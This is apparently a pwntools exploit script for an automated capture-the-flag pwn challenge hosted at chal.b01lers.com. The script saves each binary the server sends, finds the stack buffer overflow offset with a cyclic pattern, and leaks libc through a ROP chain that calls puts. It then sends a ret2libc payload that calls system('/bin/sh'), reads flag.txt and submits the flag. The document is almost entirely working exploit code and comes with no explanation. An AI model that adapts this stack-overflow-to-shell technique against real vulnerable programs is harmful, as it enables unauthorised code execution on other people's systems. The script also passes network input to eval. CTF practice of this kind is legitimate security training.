#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch='amd64')
exe = './path/to/binary'

host = args.HOST or 'chal.b01lers.com'
port = int(args.PORT or 4001)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())


def make_binary():
	io.recvuntil("b'")
	binary = io.recvline()
	if "Message" in binary:
		binary = binary.strip(b"Message: \n'")
	else:
		binary = binary.strip(b"Name: \n'")
	binary = eval(b"b'" +  binary + b"'")
	with open("chall", "wb") as f:
		f.write(binary)
	os.system("chmod +x chall")

def GetOffsetStdin():
    p = process("./chall")
    p.recv()
    p.sendline(cyclic(512))
    p.wait()
    time.sleep(2)
    core = p.corefile
    fault = core.fault_addr
    ofst = cyclic_find(fault & 0xffffffff)
    p.close()
    print(ofst)
    return ofst

def exploit():
	context.arch='amd64'
	offset = GetOffsetStdin()
	exe = ELF("./chall")
	pop_rdi = exe.search(asm("pop rdi; ret")).next()
	ret = exe.search(asm("ret")).next()
	payload1 = b"A" * offset + p64(pop_rdi) + p64(exe.sym['__libc_start_main']) + p64(exe.plt['puts']) + p64(exe.sym.main)
	io.sendline(payload1)
	io.recvline()
	io.recvline()
	leak = u64(io.recvline().strip(b"\n").ljust(8, b'\x00'))
	print("libc leak : %s" % hex(leak))
	libc = ELF("./libc6_2.31-0ubuntu9.1_amd64.so")
	libc_base = leak - libc.sym['__libc_start_main']
	print("libc base : %s" % hex(libc_base))
	system       = libc_base + libc.sym['system']
	binsh        = libc_base + next(libc.search("/bin/sh"))
	libc
	payload2 = flat([
		b"A" * offset,
		ret,
		pop_rdi,
		binsh,
		system
	])
	io.recv()
	io.sendline(payload2)
	io.recv()
	io.sendline("cat flag.txt")
	io.recvuntil("bctf")
	flag = "bctf" + io.recvuntil("}")
	print("FLAG : %s " % flag)
	io.sendline("exit")
	io.recvuntil("flag> ")
	io.sendline(flag)
# -- Exploit goes here --
# context.log_level = 'warn'
io = start()
while True:
	try:
		make_binary()
		exploit()
	except:
		io.interactive()